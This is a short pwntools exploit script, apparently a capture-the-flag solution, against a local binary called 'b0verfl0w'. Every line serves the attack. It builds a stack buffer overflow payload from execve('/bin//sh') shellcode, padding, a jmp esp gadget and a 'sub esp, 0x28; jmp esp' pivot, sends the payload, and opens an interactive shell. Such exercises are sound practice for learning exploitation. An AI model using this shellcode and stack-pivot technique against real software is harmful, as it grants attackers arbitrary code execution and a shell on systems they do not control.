from pwn import *

io = process("./b0verfl0w")

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
print len(shellcode)

jmp_esp = 0x08048504
sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
payload  = shellcode.ljust(0x20, 'A')
payload += 'dead' + p32(jmp_esp) + sub_esp_jmp

print len(payload)
io.sendline(payload)
io.interactive()